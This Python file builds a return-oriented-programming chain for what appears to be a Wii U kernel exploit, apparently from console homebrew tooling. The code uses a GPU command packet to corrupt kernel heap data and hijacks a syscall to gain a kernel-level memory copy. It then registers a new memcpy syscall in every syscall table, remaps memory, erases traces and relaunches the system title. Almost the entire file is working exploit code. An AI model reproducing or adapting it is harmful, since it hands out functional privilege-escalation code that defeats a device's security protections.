from ropgadgets import *
from common_defines import *


# This is only valid for a short time
def kern_memcpy(dest, src, len):
    # Calls syscall 0x32
    return call_func(ROP_Register, dest, src, len)


def memory_mapping_ropchain_calls(drvname_addr, fake_heap_entry_addr, fake_heap_addr, pm4_packet_addr, extra_data_addr, rpl_name_addr, function_name_addr):
    cur_chain = []

    # Suspend the main thread
    cur_chain += OSSuspendThread(0x100457E0)

    real_fake_heap_addr = 0x2F200014
    cur_chain += memcpy(real_fake_heap_addr, fake_heap_addr, 0x10)
    cur_chain += DCFlushRange(real_fake_heap_addr, 0x10)

    # This will set KERN_HEAP_PHYS + STARTID_OFFSET to 0x03000000
    cur_chain += DCFlushRange(pm4_packet_addr, 0x20)
    cur_chain += GX2DirectCallDisplayList(pm4_packet_addr, 0x20)
    cur_chain += GX2DirectCallDisplayList(pm4_packet_addr, 0x20)
    cur_chain += GX2DirectCallDisplayList(pm4_packet_addr, 0x20)

    cur_chain += GX2Flush()
    cur_chain += GX2DrawDone()

    cur_chain += OSDriver_Register(drvname_addr, 3, 0, 0)

    cur_chain += write32(fake_heap_entry_addr + 0x44, KERN_SYSCALL_TBL_2 + (0x32 * 4))  # override the register syscall with new kernel copy data
    cur_chain += DCFlushRange(fake_heap_entry_addr + 0x44, 0x04)
    cur_chain += OSDriver_CopyToSaveArea(drvname_addr, 3, extra_data_addr, 4)

    cur_chain += kern_memcpy(KERNEL_ADDRESS_TABLE + (0x12 * 4), extra_data_addr + 0xC, 8)  # memory mapping
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_1 + (0x25 * 4), extra_data_addr, 4)  # register syscall 0x25 as memcpy
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_2 + (0x25 * 4), extra_data_addr, 4)  # register syscall 0x25 as memcpy
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_3 + (0x25 * 4), extra_data_addr, 4)  # register syscall 0x25 as memcpy
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_4 + (0x25 * 4), extra_data_addr, 4)  # register syscall 0x25 as memcpy
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_5 + (0x25 * 4), extra_data_addr, 4)  # register syscall 0x25 as memcpy
    cur_chain += kern_memcpy(KERN_HEAP + STARTID_OFFSET, extra_data_addr + 8, 4)  # clean exploit stuff
    cur_chain += kern_memcpy(KERN_DRVPTR, fake_heap_entry_addr + 0x48, 4)  # clean exploit stuff
    cur_chain += kern_memcpy(KERN_SYSCALL_TBL_2 + (0x32 * 4), extra_data_addr + 0x04, 4)  # restore syscall  0x32

    cur_chain += FindExportAndCall(extra_data_addr + 0x14, rpl_name_addr, function_name_addr)  # SYSRelaunchTitle
    cur_chain += OSResumeThread(0x100457E0)  # Restart the main thread

    cur_chain += OSExitThread(0)

    return cur_chain


def memory_mapping_ropchain_data(base):
    cur_chain = []

    drvname_addr = base
    tmp_chain = [0x58585800]
    cur_chain += tmp_chain

    fake_heap_addr = drvname_addr + (len(tmp_chain) * 4)
    fake_heap_entry_addr = 0x105F0000
    tmp_chain = [fake_heap_entry_addr,
                 0xFFFFFFB4,
                 0xFFFFFFFF,
                 0xFFFFFFFF]
    cur_chain += tmp_chain
    cur_addr = fake_heap_addr + (len(tmp_chain) * 4)

    # align pm4 packet to 0x20
    offset = ((cur_addr + 31 & ~ 31) - cur_addr) >> 2
    tmp_chain = []
    for i in range(0, offset):
        tmp_chain.append(0xDEADAFFE)
    cur_chain += tmp_chain

    kpaddr = KERN_HEAP_PHYS + STARTID_OFFSET
    pm4_packet_addr = cur_addr + (len(tmp_chain) * 4)
    tmp_chain = [0xC0013900,
                 kpaddr,
                 0xC0000000,
                 0x80000000,
                 0x80000000,
                 0x80000000,
                 0x80000000,
                 0x80000000]
    cur_chain += tmp_chain

    # extra_data
    extra_data_addr = pm4_packet_addr + (len(tmp_chain) * 4)
    tmp_chain = [0xfff09e44,
                 0xfff1104c,
                 0,
                 0x10000000,
                 0x28305800,
                 0xDEADABBC,
                 0xDEADABBE]
    cur_chain += tmp_chain

    # rpl_name_addr
    rpl_name_addr = extra_data_addr + (len(tmp_chain) * 4)
    tmp_chain = [0x73797361,
                 0x70702E72,
                 0x706C0000]
    cur_chain += tmp_chain

    # function_name_addr
    function_name_addr = rpl_name_addr + (len(tmp_chain) * 4)
    tmp_chain = [0x53595352,
                 0x656C6175,
                 0x6E636854,
                 0x69746C65,
                 0x00000000]
    cur_chain += tmp_chain

    return [cur_chain, drvname_addr, fake_heap_entry_addr, fake_heap_addr, pm4_packet_addr, extra_data_addr, rpl_name_addr, function_name_addr]


def memory_mapping_ropchain():
    base = 0x4D900000 + 0x14
    # Get the length of the "function calls" to calcutes offsets
    rop_len = len(memory_mapping_ropchain_calls(0, 0, 0, 0, 0, 0, 0)) * 4

    # Get the data and their addresses.
    tmp_data = memory_mapping_ropchain_data(base + rop_len)

    # Build real ropchain
    cur_chain = []
    cur_chain += memory_mapping_ropchain_calls(tmp_data[1], tmp_data[2], tmp_data[3], tmp_data[4], tmp_data[5], tmp_data[6], tmp_data[7])
    cur_chain += tmp_data[0]
    return cur_chain
